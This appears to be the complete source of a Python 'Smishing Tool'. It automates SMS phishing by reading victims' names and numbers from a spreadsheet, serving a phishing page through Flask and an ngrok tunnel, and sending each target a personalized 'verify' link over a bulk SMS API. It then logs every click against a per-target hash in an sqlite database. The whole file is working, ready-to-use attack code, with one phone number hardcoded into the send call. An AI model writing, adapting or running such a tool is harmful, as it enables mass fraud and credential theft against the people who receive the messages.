#!/usr/bin/python3

import requests , json , hashlib , art , subprocess , time , multiprocessing , sqlite3 , datetime
from flask import Flask as flask
from flask import request , url_for , render_template
import openpyxl as excel 
from colorama import Fore, Back, Style

connection = sqlite3.connect("dbz")
Cursor = connection.cursor()
inspect_url = "http://localhost:4040/"
filename = "targets.xlsx"
token = "<Token>"  # change this to your token
app = flask(__name__)
@app.route("/")
def index():
    try:
        connection = sqlite3.connect("dbz")
        Cursor = connection.cursor()
        hash = request.args.get("login")
        timing = datetime.datetime.now()
        Cursor.execute("INSERT INTO phished (hash, timings) VALUES(?,?)",(hash,timing))
        connection.commit()
    except Exception as e:
        pass
    return render_template('index.html')

def API(target): 
    digest = hashlib.md5(str(target[1]).encode()).hexdigest()
    try:
        Cursor.execute("INSERT INTO target (hash, name) VALUES(?,?)",(digest,target[0]))
        connection.commit()
    except Exception as e:
        pass
    url =json.loads(requests.get(inspect_url+"api/tunnels").text)['tunnels'][0]['public_url']+"/?login="+digest
    msg = message(target[0]) + "Click here to verify " + url
    api_endpoint = "https://www.fast2sms.com/dev/bulkV2?authorization={0}&route=q&message={1}&language=english&flash=0&numbers={2}".format(token,msg,'8178682111')
    response = requests.get(api_endpoint)
    return response.status_code

def message(name):
    with open("scenario.txt",'r') as file:
        text = "".join(file.readlines()).replace("[NAME]",name)
        return text

def format_text(title,item, log=0):
    if log==1:
        text = Style.BRIGHT + Fore.RED + " [-] " + Fore.RESET + Fore.YELLOW + title + Fore.RESET + Fore.BLUE + item + Fore.RESET
    else:
        cr = '\r\n'
        section_break=cr + '*'*20 + cr 
        item=str(item)
        text= Style.BRIGHT+ Fore.RED + title + Fore.RESET + Fore.YELLOW +section_break + Fore.BLUE + item + Fore.YELLOW + section_break + Fore.RESET
    return text

def numbers(file):
    workbook = excel.load_workbook(file)
    sheet = workbook.active
    sheet_data = list()
    counter = 0
    for rows in sheet.iter_rows(max_col=sheet.max_column):
        if counter >3:
            break
        if rows[0].value != None:
            sheet_data.append((rows[0].value,rows[1].value))
        else:
            counter +=1
    return sheet_data

def server():
    app.run(debug=False)

def main():
    banner = art.text2art("Smishing Tool", font="slant") + "\n\t\t\t-by Ishan Saha"
    usage = """
    Save the scenario in a text file with the name as "scenario.txt".
    The target list should be in targets.xlsx with 2 column "Name, Number".

    The application will by itself start a flask application with a phishing page
    and then a ngrok tunnel as well. 
    """
    print(format_text(banner,usage))
    try:
        print(format_text("Note:","Preparing Server...",1))
        flaskapp = multiprocessing.Process(target=server)
        flaskapp.start()
        print(format_text("Wait:","10 seconds",1))
        time.sleep(10)
        print(format_text("Note:","Starting ngrok tunnel...",1))
        ngrok = subprocess.Popen(['./ngrok','http','http://localhost:5000'],stdout=subprocess.PIPE)
        time.sleep(10)
        for target_data in numbers(filename):
            print(format_text("Note:","Preparing the scenario for "+target_data[0],1))
            API(target_data)
    except Exception as e: 
        print(format_text("Error: ",str(e),1))

if __name__== "__main__":
    main()
